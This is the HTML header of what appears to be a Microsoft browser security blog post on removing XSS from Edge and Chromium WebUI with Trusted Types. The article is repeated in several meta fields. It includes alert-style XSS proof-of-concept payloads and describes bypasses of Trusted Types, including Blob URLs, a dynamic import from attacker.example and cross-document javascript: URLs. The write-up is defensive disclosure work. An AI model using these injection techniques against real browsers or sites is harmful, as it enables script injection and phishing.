<!DOCTYPE html><html lang="en" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="twitter:image" content="https://microsoftedge.github.io/edgevr/assets/img/edge-logo-128x128.png"><title>Eliminating XSS from WebUI with Trusted Types | Microsoft Browser Vulnerability Research</title><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Eliminating XSS from WebUI with Trusted Types" /><meta name="author" content="Jun Kokatsu" /><meta property="og:locale" content="en_US" /><meta name="description" content="After the research on Site Isolation, it became clear that the most common problem with extensions is calling chrome.tabs.create with a URL received from a content script message. While such a bug can be used to steal local files, it can also open up an interesting attack surface, which is the navigation to WebUI. In this blog post, we will review a few vulnerabilities in WebUI, followed by a few Trusted Types bypasses, and finally, how we mitigated and potentially killed the XSS as a bug class in most of Edge‚Äôs WebUI with Trusted Types. What is WebUI? ‚ÄúWebUI‚Äù is a term used to loosely describe parts of Chromium‚Äôs UI implemented with web technologies (i.e. HTML, CSS, JavaScript), such as chrome://settings. Additionally, chrome: (or edge:) scheme pages have special privileges, such as access to camera and mic without requesting permission, even though it is hosted in a sandboxed renderer process. Restrictions on chrome: scheme pages Due to some special privileges in chrome: scheme pages, those pages have some restrictions: Normal websites can‚Äôt navigate to chrome: scheme pages. chrome: scheme pages don‚Äôt have access to the network. Therefore, while there have been several XSS vulnerabilities on WebUI in the past, most of those were treated as low severity bugs. But if a user has an extension or two installed, there is a high possibility that a compromised render can navigate to WebUI (due to chrome.tabs.create bugs), and therefore trigger an XSS vulnerability. XSSes found on WebUI: While reviewing the Chromium code, I was able to find the following XSS bugs on WebUI. XSS on chrome://histograms chrome://histograms renders list of histograms (i.e. telemetry) collected in the browser. While reviewing the JS code of chrome://histograms, I found the following code: 1 2 3 4 5 6 7 8 9 10 function addHistograms(histograms) { let htmlOutput = &#39;&#39;; for (const histogram of histograms) { htmlOutput += histogram; } // NOTE: This is generally unsafe due to XSS attacks. Make sure |htmlOutput| // cannot be modified by an external party. $(&#39;histograms&#39;).innerHTML = htmlOutput; } From the code, it‚Äôs clear that if I can somehow control the value of histogram, this will result in an XSS üòä And of course, the browser wants to get telemetry from everywhere, so there is a way to add a histogram from a renderer process. With a compromised renderer, an attacker can call the following C++ code in the renderer process to cause an XSS. 1 2 3 4 5 6 enum class XSSMetrics { ktest = 0, kMaxValue = ktest, }; LOCAL_HISTOGRAM_ENUMERATION(&quot;XSS.&lt;style&gt;*{background:red;}&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;&quot;, XSSMetrics::ktest); While the script will be blocked by CSP, inline CSS is allowed in the WebUI. Which looked like the following üòä The bug was quickly fixed by sanitizing the HTML before calling innerHTML. I‚Äôve also contributed an additional fix which removed the innerHTML usage entirely in the chrome://histograms. XSS on SSL error page The SSL error page on Chromium is somewhat special. On Windows, SSL error pages are rendered on chrome-error://chromewebdata, which isn‚Äôt as privileged as chrome: scheme pages, but it does have some special methods exposed in window.certificateErrorPageController. However, chrome://interstitials hosts the same SSL error pages, so technically XSS on the SSL error page can have an impact on chrome: scheme pages. While reviewing the code in SSL error page, I found the following code in one of the JS files included in the SSL error page: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 /** * Ensures interstitial pages on iOS aren&#39;t loaded from cache, which breaks * the commands due to ErrorRetryStateMachine::DidFailProvisionalNavigation * not getting triggered. */ function setupIosRefresh() { if (!loadTimeData.getBoolean(&#39;committed_interstitials_enabled&#39;)) { return; } const params = new URLSearchParams(window.location.search.substring(1)); const failedUrl = decodeURIComponent(params.get(&#39;url&#39;) || &#39;&#39;); &lt;-- [1] const load = () =&gt; { window.location.replace(failedUrl); &lt;-- [2] }; window.addEventListener(&#39;pageshow&#39;, function(e) { window.onpageshow = load; }, {once: true}); } // &lt;if expr=&quot;is_ios&quot;&gt; document.addEventListener(&#39;DOMContentLoaded&#39;, setupIosRefresh); // &lt;/if&gt; This is an XSS, as the url parameter[1] can be a JavaScript URL, and navigating to that url[2] will cause an XSS. However, the vulnerable code was only exposed to Chrome for iOS (and it was behind a flag which was only enabled in beta at the time). Interestingly, Chrome for iOS renders the SSL error page inside the origin where the SSL error occurred. This means that the XSS bug would actually lead to a UXSS, because SSL error can be triggered on any origin when an attacker is Man-in-the-Middle. The following video shows the UXSS in action: This bug was fixed by navigating to a URL provided by the browser process, instead of using the url parameter which can be malicious. Ways to exploit XSS on WebUI As we saw in chrome://histograms, most of WebUI has the following CSP mitigation. 1 2 3 4 5 Content-Security-Policy: child-src &#39;none&#39;; object-src &#39;none&#39;; script-src chrome://resources &#39;self&#39;; frame-ancestors &#39;none&#39;; This does mitigate XSS, but there are few ways to exploit XSS even with the above CSP. Find Script Gadgets in the WebUI or one of JS files under chrome://resources. I was able to find a few Script Gadgets in some WebUI pages due to usage of Polymer 1. Since subresources such as CSS and images can be loaded using Data URL, find a bug in those parsers and compromise the WebUI process that way. Due to the nature of WebUI, some WebUI doesn‚Äôt have an address bar (e.g. chrome://print used for print preview). In those cases, you can inject a meta tag with refresh to navigate to an attacker‚Äôs site where you can have a fake login form. With the increase of new features that use WebUI in Edge such as Edge Shopping and Web Capture, the above threat seemed like an important problem to solve. One interesting aspect of WebUI is that almost all WebUI consist of static HTML, JS, and CSS files. And only few WebUI has dynamic content with user inputs when serving WebUI (e.g. chrome://blob-internals which uses net::EscapeForHTML to escape user inputs). This means the threat of XSS in WebUI is mostly the DOM-based XSS. And luckily, the Web Platform has a solution for DOM-based XSS üòä Trusted Types to the rescue! Trusted Types introduces a new type system to the Web Platform, and it can enforce dangerous sinks to only accept Trusted Types objects instead of strings. Example: 1 2 3 4 5 6 7 8 9 // Content-Security-Policy: require-trusted-types-for &#39;script&#39;; // Throws a TypeError because of a string assignment to a dangerous sink. document.body.innerHTML += &quot;&lt;b&gt;Hello &quot; + location.hash.slice(1) + &quot;&lt;/b&gt;&quot;; // Success because textContent isn&#39;t a dangerous sink. const bold = document.createElement(&quot;b&quot;); bold.textContent = &quot;Hello &quot; + location.hash.slice(1); document.body.appendChild(bold); This enforces secure coding practice, where developers are required to use one of the following options: Write code with safe DOM APIs (e.g. use createElement and appendChild instead of innerHTML). Create a Trusted Type policy where you can sanitize an input. Example: 1 2 3 4 5 6 7 8 // Content-Security-Policy: require-trusted-types-for &#39;script&#39;; const escapeHTMLPolicy = trustedTypes.createPolicy(&#39;myEscapePolicy&#39;, { createHTML: string =&gt; string.replace(/\&lt;/g, &#39;&amp;lt;&#39;) }); // Success because input is sanitized through a Trusted Type policy document.body.innerHTML = escapeHTMLPolicy.createHTML(&#39;&lt;img src=x onerror=alert(1)&gt;&#39;); This surprisingly simple mechanism can help defeat DOM-based XSS, because we can ensure that all assignments to dangerous sinks go through sanitization. Which means as long as the sanitization in Trusted Type policies are solid, there won‚Äôt be a DOM-based XSS. Can we trust Trusted Types? When I see a security feature, the first thing I do is to test it üòä And I was able to find a few ways to bypass Trusted Types (some were known). Platform-level bypasses Blob URL When creating a Blob URL, an attacker-controlled string may be used depending on the Web application. Example: 1 2 3 4 5 let attackerControlledString = &#39;&lt;script&gt;alert(document.domain)&lt;\/script&gt;&#39;; const html = &#39;&lt;h1&gt; Hello &#39; + attackerControlledString + &#39;!&lt;/h1&gt;&#39;; const blob = new Blob([html], {type: &#39;text/html&#39;}); const url = URL.createObjectURL(blob); location = url; // XSS While it seems like the string assignment to Blob object needs Trusted Types enforcement, it‚Äôs difficult to enforce it because: The type argument can be something safe (e.g. text/plain) or something unknown (maybe application/signed-exchange in the future?). URL.createObjectURL also accepts File object and MediaSource object. I reported this bug, but it remains unpatched at the time of writing (probably due to the complexity). Conclusion here is that we should probably change Blob URL to something safe üòä Script loading like import Non-DOM API based script loading aren‚Äôt currently enforced by Trusted Types. Example: 1 2 let attackerControlledString = &#39;/attacker.example/exploit&#39;; import(`/${attackerControlledString}.js`); // XSS While this isn‚Äôt ideal, this can be mitigated by setting CSP script-src with allow-list of origins/URLs (which WebUI does by default). Application specific bypass Cross-document vectors As the Trusted Types specification indicates, interaction of 2 documents might bypass a Trusted Types if one of them doesn‚Äôt have a Trusted Types enforced. While this sounds obvious, it‚Äôs an interesting vector because of how Trusted Types handles a JavaScript URL. When a JavaScript URL is assigned to HTMLAnchorElement.href, HTMLIFrameElement.src, etc, it results in a DOM-based XSS. However, Trusted Types doesn‚Äôt block assignments of JavaScript URL to those sinks. Instead, it blocks the navigation to a JavaScript URL if the Trusted Types is enforced in the document (just like how CSP‚Äôs script-src blocks a JavaScript URL). This means the following cross-document interaction becomes vulnerable. 1 2 3 4 5 6 7 8 9 10 11 &lt;!-- this application allows embedding iframe with any https: website and any name attribute --&gt; &lt;iframe src=&quot;/robots.txt&quot; name=&quot;new&quot;&gt;&lt;/iframe&gt; &lt;script&gt; let attackerControlledString = &#39;javascript:alert(origin)&#39;; const a = document.createElement(&#39;a&#39;); a.href = attackerControlledString; a.target = &#39;new&#39;; a.textContent = &#39;Open new window&#39;; document.body.appendChild(a); &lt;/script&gt; If the robots.txt doesn‚Äôt have Trusted Types enforced, clicking the JavaScript URL link will result in a DOM-based XSS, because the JavaScript URL will execute in the document of robots.txt iframe. This is not only an issue in Trusted Types, but it has been a known issue for a while in CSP. And Origin Policy tries to tackle this problem by serving a default policy headers for all pages in the origin. This issue can be mitigated by enforcing Trusted Types or CSP script-src on every page (which WebUI does by default). Deploying Perfect Types Given that Trusted Types only has few bypasses and most of them can be mitigated, I‚Äôve made contributions to Chromium and deployed Perfect Types to WebUI by default. Perfect Types is a Trusted Types enforcement that doesn‚Äôt allow any Trusted Type policy creation. 1 Content-Security-Policy: require-trusted-types-for &#39;script&#39;; trusted-types &#39;none&#39;; This guarantees that the page doesn‚Äôt use any dangerous sinks, and therefore the page is DOM-XSS free üòä Of course, some WebUI does require Trusted Type policy, which we have reviewed and only allowed reviewed policies via trusted-types response header. Unfortunately, many WebUI in Chromium use Polymer, which does not support Trusted Types yet. But coincidentally, the Edge Browser Experience team refactored most of the user facing WebUI in Edge using React, which supports Trusted Types. Therefore, Trusted Types is enabled on all the core WebUI in Edge (e.g. edge://settings, edge://downloads, edge://history, edge://print, etc), where I had to disable Trusted Types in Chromium due to Polymer. The Future work Some WebUI pages required Trusted Type policy because of static string assignment to dangerous sinks or use of a sanitizer. The static string assignment is especially a problem for JS libraries. For example, if a JS library wants to convert the following code to be compatible with Trusted Types without Trusted Type policy: 1 document.body.innerHTML += &#39;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;Hello World!!&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&#39;; The following is how they need to do it today: 1 2 3 4 5 6 7 8 9 const table = document.createElement(&#39;table&#39;); const tbody = document.createElement(&#39;tbody&#39;); const tr = document.createElement(&#39;tr&#39;); const td = document.createElement(&#39;td&#39;); td.textContent = &#39;Hello World!!&#39;; tr.appendChild(td); tbody.appendChild(tr); table.appendChild(tbody); document.body.appendChild(table); The conversion increases the amount of code and makes the code less readable, even though it‚Äôs definitely a safe HTML. Therefore, I believe that such a Trusted Type policy can be simplified or removed, if we can guarantee that those won‚Äôt cause an XSS. Thankfully, Sanitizer API aims to expose an ever-green XSS free sanitizer natively in the browsers. We are involved in the discussion of Sanitizer API so that it‚Äôll integrate well with Trusted Types, and hopefully reduce the necessity of Trusted Type policy creation to minimal. This will reduce both time and amount of coding required for developers, and security code audit required for new Trusted Type policy. Takeaways There were a few lessons I learned. First, while we invest a lot in fuzzing, static analysis, and other automation to scale bug findings, sometimes moving to secure coding practices like Trusted Types is the right answer. While we had to contribute to a few libraries (such as react virtualized), converting code to be compatible with Trusted Types was much better than writing a tool to detect potential XSS (which is difficult üòã). Going forward, we will need to choose a third-party library that supports Trusted Types (or we will contribute to it). And I hope that Trusted Types support for libraries/frameworks will be important for every site, as deployment of Trusted Types grows. Second, security feature support in WebKit does matter to Chromium users. Unfortunately, bugs like XSS on the SSL error page will be exploitable on iOS even after enabling Trusted Types, because WebKit doesn‚Äôt support Trusted Types. Third, understanding the pain points of converting existing code to Trusted Types was a net positive experience. I was able to get a feeling for how a developer‚Äôs day looks, and see how they strike a balance between security, code complexity, readability, and ease of conversion. Hopefully, this experience will help shape the better integration of Sanitizer API with Trusted Types. Conclusion With the help of Trusted Types, we were able to mitigate DOM-based XSS in most of Edge‚Äôs WebUI. And due to the nature of WebUI which only serves static HTML or JS files, most of Edge‚Äôs WebUI is now XSS free in Edge 90 üòä I‚Äôm excited to see what will be the next bug class in WebUI after solving XSS! If you are interested in finding bugs on WebUI, you can take a look at the list of WebUI in edge://about or in kChromeUrls. I would like to thank Koto and the rest of the Google Security team who invented Trusted Types, as well as Mike West, Demetrios, and the rest of the Chromium team who helped me contribute to Chromium." /><meta property="og:description" content="After the research on Site Isolation, it became clear that the most common problem with extensions is calling chrome.tabs.create with a URL received from a content script message. While such a bug can be used to steal local files, it can also open up an interesting attack surface, which is the navigation to WebUI. In this blog post, we will review a few vulnerabilities in WebUI, followed by a few Trusted Types bypasses, and finally, how we mitigated and potentially killed the XSS as a bug class in most of Edge‚Äôs WebUI with Trusted Types. What is WebUI? ‚ÄúWebUI‚Äù is a term used to loosely describe parts of Chromium‚Äôs UI implemented with web technologies (i.e. HTML, CSS, JavaScript), such as chrome://settings. Additionally, chrome: (or edge:) scheme pages have special privileges, such as access to camera and mic without requesting permission, even though it is hosted in a sandboxed renderer process. Restrictions on chrome: scheme pages Due to some special privileges in chrome: scheme pages, those pages have some restrictions: Normal websites can‚Äôt navigate to chrome: scheme pages. chrome: scheme pages don‚Äôt have access to the network. Therefore, while there have been several XSS vulnerabilities on WebUI in the past, most of those were treated as low severity bugs. But if a user has an extension or two installed, there is a high possibility that a compromised render can navigate to WebUI (due to chrome.tabs.create bugs), and therefore trigger an XSS vulnerability. XSSes found on WebUI: While reviewing the Chromium code, I was able to find the following XSS bugs on WebUI. XSS on chrome://histograms chrome://histograms renders list of histograms (i.e. telemetry) collected in the browser. While reviewing the JS code of chrome://histograms, I found the following code: 1 2 3 4 5 6 7 8 9 10 function addHistograms(histograms) { let htmlOutput = &#39;&#39;; for (const histogram of histograms) { htmlOutput += histogram; } // NOTE: This is generally unsafe due to XSS attacks. Make sure |htmlOutput| // cannot be modified by an external party. $(&#39;histograms&#39;).innerHTML = htmlOutput; } From the code, it‚Äôs clear that if I can somehow control the value of histogram, this will result in an XSS üòä And of course, the browser wants to get telemetry from everywhere, so there is a way to add a histogram from a renderer process. With a compromised renderer, an attacker can call the following C++ code in the renderer process to cause an XSS. 1 2 3 4 5 6 enum class XSSMetrics { ktest = 0, kMaxValue = ktest, }; LOCAL_HISTOGRAM_ENUMERATION(&quot;XSS.&lt;style&gt;*{background:red;}&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;&quot;, XSSMetrics::ktest); While the script will be blocked by CSP, inline CSS is allowed in the WebUI. Which looked like the following üòä The bug was quickly fixed by sanitizing the HTML before calling innerHTML. I‚Äôve also contributed an additional fix which removed the innerHTML usage entirely in the chrome://histograms. XSS on SSL error page The SSL error page on Chromium is somewhat special. On Windows, SSL error pages are rendered on chrome-error://chromewebdata, which isn‚Äôt as privileged as chrome: scheme pages, but it does have some special methods exposed in window.certificateErrorPageController. However, chrome://interstitials hosts the same SSL error pages, so technically XSS on the SSL error page can have an impact on chrome: scheme pages. While reviewing the code in SSL error page, I found the following code in one of the JS files included in the SSL error page: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 /** * Ensures interstitial pages on iOS aren&#39;t loaded from cache, which breaks * the commands due to ErrorRetryStateMachine::DidFailProvisionalNavigation * not getting triggered. */ function setupIosRefresh() { if (!loadTimeData.getBoolean(&#39;committed_interstitials_enabled&#39;)) { return; } const params = new URLSearchParams(window.location.search.substring(1)); const failedUrl = decodeURIComponent(params.get(&#39;url&#39;) || &#39;&#39;); &lt;-- [1] const load = () =&gt; { window.location.replace(failedUrl); &lt;-- [2] }; window.addEventListener(&#39;pageshow&#39;, function(e) { window.onpageshow = load; }, {once: true}); } // &lt;if expr=&quot;is_ios&quot;&gt; document.addEventListener(&#39;DOMContentLoaded&#39;, setupIosRefresh); // &lt;/if&gt; This is an XSS, as the url parameter[1] can be a JavaScript URL, and navigating to that url[2] will cause an XSS. However, the vulnerable code was only exposed to Chrome for iOS (and it was behind a flag which was only enabled in beta at the time). Interestingly, Chrome for iOS renders the SSL error page inside the origin where the SSL error occurred. This means that the XSS bug would actually lead to a UXSS, because SSL error can be triggered on any origin when an attacker is Man-in-the-Middle. The following video shows the UXSS in action: This bug was fixed by navigating to a URL provided by the browser process, instead of using the url parameter which can be malicious. Ways to exploit XSS on WebUI As we saw in chrome://histograms, most of WebUI has the following CSP mitigation. 1 2 3 4 5 Content-Security-Policy: child-src &#39;none&#39;; object-src &#39;none&#39;; script-src chrome://resources &#39;self&#39;; frame-ancestors &#39;none&#39;; This does mitigate XSS, but there are few ways to exploit XSS even with the above CSP. Find Script Gadgets in the WebUI or one of JS files under chrome://resources. I was able to find a few Script Gadgets in some WebUI pages due to usage of Polymer 1. Since subresources such as CSS and images can be loaded using Data URL, find a bug in those parsers and compromise the WebUI process that way. Due to the nature of WebUI, some WebUI doesn‚Äôt have an address bar (e.g. chrome://print used for print preview). In those cases, you can inject a meta tag with refresh to navigate to an attacker‚Äôs site where you can have a fake login form. With the increase of new features that use WebUI in Edge such as Edge Shopping and Web Capture, the above threat seemed like an important problem to solve. One interesting aspect of WebUI is that almost all WebUI consist of static HTML, JS, and CSS files. And only few WebUI has dynamic content with user inputs when serving WebUI (e.g. chrome://blob-internals which uses net::EscapeForHTML to escape user inputs). This means the threat of XSS in WebUI is mostly the DOM-based XSS. And luckily, the Web Platform has a solution for DOM-based XSS üòä Trusted Types to the rescue! Trusted Types introduces a new type system to the Web Platform, and it can enforce dangerous sinks to only accept Trusted Types objects instead of strings. Example: 1 2 3 4 5 6 7 8 9 // Content-Security-Policy: require-trusted-types-for &#39;script&#39;; // Throws a TypeError because of a string assignment to a dangerous sink. document.body.innerHTML += &quot;&lt;b&gt;Hello &quot; + location.hash.slice(1) + &quot;&lt;/b&gt;&quot;; // Success because textContent isn&#39;t a dangerous sink. const bold = document.createElement(&quot;b&quot;); bold.textContent = &quot;Hello &quot; + location.hash.slice(1); document.body.appendChild(bold); This enforces secure coding practice, where developers are required to use one of the following options: Write code with safe DOM APIs (e.g. use createElement and appendChild instead of innerHTML). Create a Trusted Type policy where you can sanitize an input. Example: 1 2 3 4 5 6 7 8 // Content-Security-Policy: require-trusted-types-for &#39;script&#39;; const escapeHTMLPolicy = trustedTypes.createPolicy(&#39;myEscapePolicy&#39;, { createHTML: string =&gt; string.replace(/\&lt;/g, &#39;&amp;lt;&#39;) }); // Success because input is sanitized through a Trusted Type policy document.body.innerHTML = escapeHTMLPolicy.createHTML(&#39;&lt;img src=x onerror=alert(1)&gt;&#39;); This surprisingly simple mechanism can help defeat DOM-based XSS, because we can ensure that all assignments to dangerous sinks go through sanitization. Which means as long as the sanitization in Trusted Type policies are solid, there won‚Äôt be a DOM-based XSS. Can we trust Trusted Types? When I see a security feature, the first thing I do is to test it üòä And I was able to find a few ways to bypass Trusted Types (some were known). Platform-level bypasses Blob URL When creating a Blob URL, an attacker-controlled string may be used depending on the Web application. Example: 1 2 3 4 5 let attackerControlledString = &#39;&lt;script&gt;alert(document.domain)&lt;\/script&gt;&#39;; const html = &#39;&lt;h1&gt; Hello &#39; + attackerControlledString + &#39;!&lt;/h1&gt;&#39;; const blob = new Blob([html], {type: &#39;text/html&#39;}); const url = URL.createObjectURL(blob); location = url; // XSS While it seems like the string assignment to Blob object needs Trusted Types enforcement, it‚Äôs difficult to enforce it because: The type argument can be something safe (e.g. text/plain) or something unknown (maybe application/signed-exchange in the future?). URL.createObjectURL also accepts File object and MediaSource object. I reported this bug, but it remains unpatched at the time of writing (probably due to the complexity). Conclusion here is that we should probably change Blob URL to something safe üòä Script loading like import Non-DOM API based script loading aren‚Äôt currently enforced by Trusted Types. Example: 1 2 let attackerControlledString = &#39;/attacker.example/exploit&#39;; import(`/${attackerControlledString}.js`); // XSS While this isn‚Äôt ideal, this can be mitigated by setting CSP script-src with allow-list of origins/URLs (which WebUI does by default). Application specific bypass Cross-document vectors As the Trusted Types specification indicates, interaction of 2 documents might bypass a Trusted Types if one of them doesn‚Äôt have a Trusted Types enforced. While this sounds obvious, it‚Äôs an interesting vector because of how Trusted Types handles a JavaScript URL. When a JavaScript URL is assigned to HTMLAnchorElement.href, HTMLIFrameElement.src, etc, it results in a DOM-based XSS. However, Trusted Types doesn‚Äôt block assignments of JavaScript URL to those sinks. Instead, it blocks the navigation to a JavaScript URL if the Trusted Types is enforced in the document (just like how CSP‚Äôs script-src blocks a JavaScript URL). This means the following cross-document interaction becomes vulnerable. 1 2 3 4 5 6 7 8 9 10 11 &lt;!-- this application allows embedding iframe with any https: website and any name attribute --&gt; &lt;iframe src=&quot;/robots.txt&quot; name=&quot;new&quot;&gt;&lt;/iframe&gt; &lt;script&gt; let attackerControlledString = &#39;javascript:alert(origin)&#39;; const a = document.createElement(&#39;a&#39;); a.href = attackerControlledString; a.target = &#39;new&#39;; a.textContent = &#39;Open new window&#39;; document.body.appendChild(a); &lt;/script&gt; If the robots.txt doesn‚Äôt have Trusted Types enforced, clicking the JavaScript URL link will result in a DOM-based XSS, because the JavaScript URL will execute in the document of robots.txt iframe. This is not only an issue in Trusted Types, but it has been a known issue for a while in CSP. And Origin Policy tries to tackle this problem by serving a default policy headers for all pages in the origin. This issue can be mitigated by enforcing Trusted Types or CSP script-src on every page (which WebUI does by default). Deploying Perfect Types Given that Trusted Types only has few bypasses and most of them can be mitigated, I‚Äôve made contributions to Chromium and deployed Perfect Types to WebUI by default. Perfect Types is a Trusted Types enforcement that doesn‚Äôt allow any Trusted Type policy creation. 1 Content-Security-Policy: require-trusted-types-for &#39;script&#39;; trusted-types &#39;none&#39;; This guarantees that the page doesn‚Äôt use any dangerous sinks, and therefore the page is DOM-XSS free üòä Of course, some WebUI does require Trusted Type policy, which we have reviewed and only allowed reviewed policies via trusted-types response header. Unfortunately, many WebUI in Chromium use Polymer, which does not support Trusted Types yet. But coincidentally, the Edge Browser Experience team refactored most of the user facing WebUI in Edge using React, which supports Trusted Types. Therefore, Trusted Types is enabled on all the core WebUI in Edge (e.g. edge://settings, edge://downloads, edge://history, edge://print, etc), where I had to disable Trusted Types in Chromium due to Polymer. The Future work Some WebUI pages required Trusted Type policy because of static string assignment to dangerous sinks or use of a sanitizer. The static string assignment is especially a problem for JS libraries. For example, if a JS library wants to convert the following code to be compatible with Trusted Types without Trusted Type policy: 1 document.body.innerHTML += &#39;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;Hello World!!&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&#39;; The following is how they need to do it today: 1 2 3 4 5 6 7 8 9 const table = document.createElement(&#39;table&#39;); const tbody = document.createElement(&#39;tbody&#39;); const tr = document.createElement(&#39;tr&#39;); const td = document.createElement(&#39;td&#39;); td.textContent = &#39;Hello World!!&#39;; tr.appendChild(td); tbody.appendChild(tr); table.appendChild(tbody); document.body.appendChild(table); The conversion increases the amount of code and makes the code less readable, even though it‚Äôs definitely a safe HTML. Therefore, I believe that such a Trusted Type policy can be simplified or removed, if we can guarantee that those won‚Äôt cause an XSS. Thankfully, Sanitizer API aims to expose an ever-green XSS free sanitizer natively in the browsers. We are involved in the discussion of Sanitizer API so that it‚Äôll integrate well with Trusted Types, and hopefully reduce the necessity of Trusted Type policy creation to minimal. This will reduce both time and amount of coding required for developers, and security code audit required for new Trusted Type policy. Takeaways There were a few lessons I learned. First, while we invest a lot in fuzzing, static analysis, and other automation to scale bug findings, sometimes moving to secure coding practices like Trusted Types is the right answer. While we had to contribute to a few libraries (such as react virtualized), converting code to be compatible with Trusted Types was much better than writing a tool to detect potential XSS (which is difficult üòã). Going forward, we will need to choose a third-party library that supports Trusted Types (or we will contribute to it). And I hope that Trusted Types support for libraries/frameworks will be important for every site, as deployment of Trusted Types grows. Second, security feature support in WebKit does matter to Chromium users. Unfortunately, bugs like XSS on the SSL error page will be exploitable on iOS even after enabling Trusted Types, because WebKit doesn‚Äôt support Trusted Types. Third, understanding the pain points of converting existing code to Trusted Types was a net positive experience. I was able to get a feeling for how a developer‚Äôs day looks, and see how they strike a balance between security, code complexity, readability, and ease of conversion. Hopefully, this experience will help shape the better integration of Sanitizer API with Trusted Types. Conclusion With the help of Trusted Types, we were able to mitigate DOM-based XSS in most of Edge‚Äôs WebUI. And due to the nature of WebUI which only serves static HTML or JS files, most of Edge‚Äôs WebUI is now XSS free in Edge 90 üòä I‚Äôm excited to see what will be the next bug class in WebUI after solving XSS! If you are interested in finding bugs on WebUI, you can take a look at the list of WebUI in edge://about or in kChromeUrls. I would like to thank Koto and the rest of the Google Security team who invented Trusted Types, as well as Mike West, Demetrios, and the rest of the Chromium team who helped me contribute to Chromium." /><link rel="canonical" href="https://microsoftedge.github.io/edgevr/posts/eliminating-xss-with-trusted-types/" /><meta property="og:url" content="https://microsoftedge.github.io/edgevr/posts/eliminating-xss-with-trusted-types/" /><meta property="og:site_name" content="Microsoft Browser Vulnerability Research" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-03-26T09:30:00-07:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Eliminating XSS from WebUI with Trusted Types" /><meta name="twitter:site" content="@MSEdgeDev" /><meta name="twitter:creator" content="@Jun Kokatsu" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Jun Kokatsu"},"description":"After the research on Site Isolation, it became clear that the most common problem with extensions is calling chrome.tabs.create with a URL received from a content script message. While such a bug can be used to steal local files, it can also open up an interesting attack surface, which is the navigation to WebUI. In this blog post, we will review a few vulnerabilities in WebUI, followed by a few Trusted Types bypasses, and finally, how we mitigated and potentially killed the XSS as a bug class in most of Edge‚Äôs WebUI with Trusted Types. What is WebUI? ‚ÄúWebUI‚Äù is a term used to loosely describe parts of Chromium‚Äôs UI implemented with web technologies (i.e. HTML, CSS, JavaScript), such as chrome://settings. Additionally, chrome: (or edge:) scheme pages have special privileges, such as access to camera and mic without requesting permission, even though it is hosted in a sandboxed renderer process. Restrictions on chrome: scheme pages Due to some special privileges in chrome: scheme pages, those pages have some restrictions: Normal websites can‚Äôt navigate to chrome: scheme pages. chrome: scheme pages don‚Äôt have access to the network. Therefore, while there have been several XSS vulnerabilities on WebUI in the past, most of those were treated as low severity bugs. But if a user has an extension or two installed, there is a high possibility that a compromised render can navigate to WebUI (due to chrome.tabs.create bugs), and therefore trigger an XSS vulnerability. XSSes found on WebUI: While reviewing the Chromium code, I was able to find the following XSS bugs on WebUI. XSS on chrome://histograms chrome://histograms renders list of histograms (i.e. telemetry) collected in the browser. While reviewing the JS code of chrome://histograms, I found the following code: 1 2 3 4 5 6 7 8 9 10 function addHistograms(histograms) { let htmlOutput = &#39;&#39;; for (const histogram of histograms) { htmlOutput += histogram; } // NOTE: This is generally unsafe due to XSS attacks. Make sure |htmlOutput| // cannot be modified by an external party. $(&#39;histograms&#39;).innerHTML = htmlOutput; } From the code, it‚Äôs clear that if I can somehow control the value of histogram, this will result in an XSS üòä And of course, the browser wants to get telemetry from everywhere, so there is a way to add a histogram from a renderer process. With a compromised renderer, an attacker can call the following C++ code in the renderer process to cause an XSS. 1 2 3 4 5 6 enum class XSSMetrics { ktest = 0, kMaxValue = ktest, }; LOCAL_HISTOGRAM_ENUMERATION(&quot;XSS.&lt;style&gt;*{background:red;}&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;&quot;, XSSMetrics::ktest); While the script will be blocked by CSP, inline CSS is allowed in the WebUI. Which looked like the following üòä The bug was quickly fixed by sanitizing the HTML before calling innerHTML. I‚Äôve also contributed an additional fix which removed the innerHTML usage entirely in the chrome://histograms. XSS on SSL error page The SSL error page on Chromium is somewhat special. On Windows, SSL error pages are rendered on chrome-error://chromewebdata, which isn‚Äôt as privileged as chrome: scheme pages, but it does have some special methods exposed in window.certificateErrorPageController. However, chrome://interstitials hosts the same SSL error pages, so technically XSS on the SSL error page can have an impact on chrome: scheme pages. While reviewing the code in SSL error page, I found the following code in one of the JS files included in the SSL error page: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 /** * Ensures interstitial pages on iOS aren&#39;t loaded from cache, which breaks * the commands due to ErrorRetryStateMachine::DidFailProvisionalNavigation * not getting triggered. */ function setupIosRefresh() { if (!loadTimeData.getBoolean(&#39;committed_interstitials_enabled&#39;)) { return; } const params = new URLSearchParams(window.location.search.substring(1)); const failedUrl = decodeURIComponent(params.get(&#39;url&#39;) || &#39;&#39;); &lt;-- [1] const load = () =&gt; { window.location.replace(failedUrl); &lt;-- [2] }; window.addEventListener(&#39;pageshow&#39;, function(e) { window.onpageshow = load; }, {once: true}); } // &lt;if expr=&quot;is_ios&quot;&gt; document.addEventListener(&#39;DOMContentLoaded&#39;, setupIosRefresh); // &lt;/if&gt; This is an XSS, as the url parameter[1] can be a JavaScript URL, and navigating to that url[2] will cause an XSS. However, the vulnerable code was only exposed to Chrome for iOS (and it was behind a flag which was only enabled in beta at the time). Interestingly, Chrome for iOS renders the SSL error page inside the origin where the SSL error occurred. This means that the XSS bug would actually lead to a UXSS, because SSL error can be triggered on any origin when an attacker is Man-in-the-Middle. The following video shows the UXSS in action: This bug was fixed by navigating to a URL provided by the 